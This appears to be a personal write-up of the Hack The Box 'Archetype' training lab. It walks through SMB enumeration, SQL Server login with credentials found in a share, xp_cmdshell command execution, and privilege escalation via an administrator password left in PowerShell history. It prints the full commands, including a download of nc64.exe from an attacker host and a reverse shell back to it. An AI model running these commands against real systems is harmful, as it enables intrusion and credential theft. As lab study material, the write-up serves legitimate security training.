# Archetype — HTB Lab

**Date**: 2025-09-17  
**Difficulty**: Easy  
**Target IP**: 10.129.73.77  
**Objective**: Master exploiting vulnerabilities, focusing on SMB shares, SQL Server misconfigurations, and privilege escalation.

## 1. Reconnaissance
### Tools & Commands Used
- **Nmap**: Initial network scan to identify open ports and services.
  - `qq-enum-host-nmap-all-discovery` (via Quiver, https://github.com/stevemcilwain/quiver).
  - `sudo nmap -vvv -Pn -sS -p- -sC -sV --open 10.129.73.77 -oA /home/kali/Hackthebox/archetype/hosts/10.129.73.77/nmap-all-discovery`
    - **Flags**: `-vvv` (verbose), `-Pn` (no ping), `-sS` (SYN scan), `-p-` (all ports), `-sC` (scripts), `-sV` (version), `--open` (show open ports), `-oA` (output all formats).
  - [Image Placeholder: nmap-scan]
  - [Image Placeholder: nmap-scan-cont]

### Findings
- **135/tcp**: Open, MSRPC, Microsoft Windows RPC.
- **139/tcp**: Open, NetBIOS-SSN, Microsoft Windows NetBIOS.
- **445/tcp**: Open, Microsoft-DS, Windows Server 2019 Standard 17763.
- **1433/tcp**: Open, MS-SQL-S, Microsoft SQL Server 2017 14.00.1000.00 (RTM).

## 2. Enumeration
### Tools & Commands Used
- **SMB Enumeration**:
  - List SMB shares:
    ```bash
    smbclient -L 10.129.73.77
    ```
    [Image Placeholder: smb-enum]
  - Access `backups` share:
    ```bash
    smbclient //10.129.73.77/backups
    ```
    [Image Placeholder: smb-get-backups]
- **Impacket (mssqlclient.py)**:
  - Failed login attempt (no credentials):
    ```bash
    mssqlclient.py ARCHETYPE/sql_svc@10.129.73.77 -windows-auth
    ```
    [Image Placeholder: failed-login-attempt]
  - Failed login attempt (syntax error):
    ```bash
    mssqlclient.py -windows-auth 'ARCHETYPE\sql_svc':'M3g4c0rp123'@10.129.73.77
    ```
    [Image Placeholder: second-login-failed]
  - Successful login:
    ```bash
    mssqlclient.py -windows-auth ARCHETYPE/sql_svc:M3g4c0rp123@10.129.73.77
    ```
    [Image Placeholder: login-success]

### Findings
- Discovered `backups` SMB share with accessible files.
- Found credentials `ARCHETYPE\sql_svc:M3g4c0rp123` in `prod.dtsConfig` file within the `backups` share.
- SQL Server login confirmed `sql_svc` as sysadmin:
  ```sql
  SELECT is_srvrolemember('sysadmin');
  ```
  - Returned `1` (true). [Image Placeholder: is-sysadmin-role]

## 3. Exploitation
### Vulnerability Identified
- **Vulnerability**: Microsoft SQL Server misconfiguration allowing `xp_cmdshell` execution.
- **Details**: The `sql_svc` account had sysadmin privileges, enabling `xp_cmdshell` to execute system commands on the host, leading to remote code execution (RCE).
- **Why Vulnerable**: Misconfigured SQL Server with sysadmin access and enabled `xp_cmdshell` allows arbitrary command execution without proper restrictions.

### Exploit Steps
1. Enabled `xp_cmdshell`:
   ```sql
   EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
   EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
   ```
2. Started a web server to host `nc64.exe`:
   ```bash
   sudo python3 -m http.server 80
   ```
3. Started a Netcat listener:
   ```bash
   nc -lvnp 443
   ```
   [Image Placeholder: shell-connect]
4. Downloaded `nc64.exe` to target:
   ```sql
   xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; Invoke-WebRequest -Uri http://10.10.14.106/nc64.exe -OutFile nc64.exe"
   ```
   [Image Placeholder: download-winexe]
5. Executed reverse shell:
   ```sql
   xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd 10.10.14.106 443"
   ```
6. Navigated to user’s Desktop to retrieve flag:
   ```bash
   cd C:\Users\sql_svc\Desktop
   type user.txt
   ```
   [Image Placeholder: user-flag]

## 4. Privilege Escalation
### Method
- Exploited `SeImpersonatePrivilege` using `winPEAS` and reused administrator credentials found in PowerShell history.

### Commands & Output
1. Downloaded `winPEASx64.exe`:
   ```powershell
   wget http://10.10.14.106/winPEASx64.exe -outfile winPEASx64.exe
   ```
   [Image Placeholder: download-winexe]
2. Executed `winPEAS`:
   ```powershell
   .\winPEASx64.exe
   ```
   [Image Placeholder: winpea-run]
3. Identified `SeImpersonatePrivilege` as exploitable for privilege escalation.
4. Checked PowerShell history:
   ```powershell
   type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
   ```
   - Found: `net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!`
   - [Image Placeholder: con-history]
5. Used `psexec.py` to gain administrator shell:
   ```bash
   psexec.py administrator:MEGACORP_4dm1n!!@10.129.73.77
   ```
   [Image Placeholder: admin-shell]
6. Navigated to Administrator’s Desktop for root flag:
   ```powershell
   cd C:\Users\Administrator\Desktop
   type root.txt
   ```
   [Image Placeholder: root-flag]

## 5. Post-Exploitation
- **Data Exfiltration**: None performed.
- **Persistence Method**: None established.
- **Interesting Files Found**:
  - `prod.dtsConfig` in `backups` share (contained `sql_svc` credentials).
  - `ConsoleHost_history.txt` (contained administrator credentials).

## 6. Results
- **User Flag**: 7b4bec00d1a39e3dd4e021ec3d915da8  
  [Image Placeholder: user-flag]
- **Root Flag**: b91ccec3305e98240082d4474b848528  
  [Image Placeholder: root-flag]

## 7. Lessons Learned
### Key Takeaways
- **Reconnaissance**: Nmap identified SMB (445/tcp) and SQL Server (1433/tcp) on Windows Server 2019, guiding further enumeration.
- **Enumeration**: SMB share `backups` revealed credentials in `prod.dtsConfig`. Impacket’s `mssqlclient.py` confirmed sysadmin access for `sql_svc`.
- **Exploitation**: Enabled `xp_cmdshell` to execute commands, downloaded `nc64.exe`, and established a reverse shell to access the user flag.
- **Privilege Escalation**: `winPEAS` identified `SeImpersonatePrivilege`. PowerShell history revealed administrator credentials, allowing `psexec.py` to gain root access.
- **Pentesting Tip**: Always check SMB shares for sensitive files and SQL Server for misconfigured permissions. Use tools like `impacket` for Windows authentication attacks.

### Mistakes to Avoid
- Ensure correct syntax for `mssqlclient.py` (e.g., `ARCHETYPE/sql_svc`, not `'ARCHETYPE\sql_svc'` or using backslashes).
- Verify firewall rules allow reverse shell connections; test multiple ports if needed.
- Check PowerShell history early for credentials to avoid unnecessary privilege escalation tools.

### Tools/Techniques to Remember
- **Impacket**: Suite for network protocol attacks (e.g., `mssqlclient.py`, `psexec.py`).
- **winPEAS**: Identifies privilege escalation vectors (e.g., `SeImpersonatePrivilege`).
- **xp_cmdshell**: Enables command execution in SQL Server if sysadmin access is available.
- **SMB Enumeration**: Use `smbclient` to list and access shares for sensitive data.

## 8. Images
- [Image Placeholder: nmap-scan]
- [Image Placeholder: nmap-scan-cont]
- [Image Placeholder: smb-enum]
- [Image Placeholder: smb-get-backups]
- [Image Placeholder: failed-login-attempt]
- [Image Placeholder: second-login-failed]
- [Image Placeholder: login-success]
- [Image Placeholder: is-sysadmin-role]
- [Image Placeholder: shell-connect]
- [Image Placeholder: download-winexe]
- [Image Placeholder: user-flag]
- [Image Placeholder: winpea-run]
- [Image Placeholder: con-history]
- [Image Placeholder: admin-shell]
- [Image Placeholder: root-flag]

## 9. References
- [Impacket](https://github.com/fortra/impacket)
- [winPEAS](https://github.com/carlospolop/PEASS-ng)
- [Quiver](https://github.com/stevemcilwain/quiver)